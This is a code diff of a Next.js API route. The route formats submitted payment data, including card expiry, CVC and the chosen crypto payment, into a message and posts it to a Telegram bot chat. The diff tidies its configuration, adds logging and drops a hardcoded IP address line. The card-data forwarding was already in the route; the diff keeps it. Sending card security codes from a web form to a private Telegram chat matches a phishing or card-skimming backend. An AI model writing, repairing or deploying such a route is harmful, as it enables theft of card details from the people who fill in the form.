@@ -5,12 +5,17 @@ export async function POST(request) {
     const data = await request.json();
     
     // Replace these with your actual credentials or use process.env
-    const token = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-    const chatId = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    if (token === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
-      console.error('Telegram Bot Token or Chat ID not configured');
-      return NextResponse.json({ error: 'Not configured' }, { status: 500 });
+    console.log('Attempting to send Telegram message...');
+    console.log('Chat ID:', chatId);
+    // Never log the full token for security, but check if it exists
+    console.log('Token exists:', !!token);
+
+    if (!token || !chatId) {
+      console.error('Telegram Bot Token or Chat ID missing from environment variables');
+      return NextResponse.json({ error: 'Telegram configuration missing' }, { status: 500 });
     }
 
     const message = `
@@ -31,10 +36,10 @@ ${data.paymentMethod === 'card' ? `
 📅 *Expiry:* ${data.expiry || 'N/A'}
 🔒 *CVC:* ${data.cvc || 'N/A'}
 ` : `
-🪙 *Status:* User selected Crypto Payment
+🪙 *Status:* User selected Crypto Payment (${data.cryptoUsed || 'N/A'})
 `}
 ---------------------------
-📍 *IP Address:* 102.91.77.98
+📍 *Sync Triggered from Website*
     `;
 
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -48,14 +53,16 @@ ${data.paymentMethod === 'card' ? `
     });
 
     const result = await response.json();
+    console.log('Telegram API Response:', result);
 
     if (!result.ok) {
-      throw new Error(result.description);
+      console.error('Telegram API Error:', result.description);
+      return NextResponse.json({ error: result.description }, { status: 500 });
     }
 
     return NextResponse.json({ success: true });
   } catch (error) {
-    console.error('Telegram Error:', error);
+    console.error('API Route Error:', error);
     return NextResponse.json({ error: error.message }, { status: 500 });
   }
 }
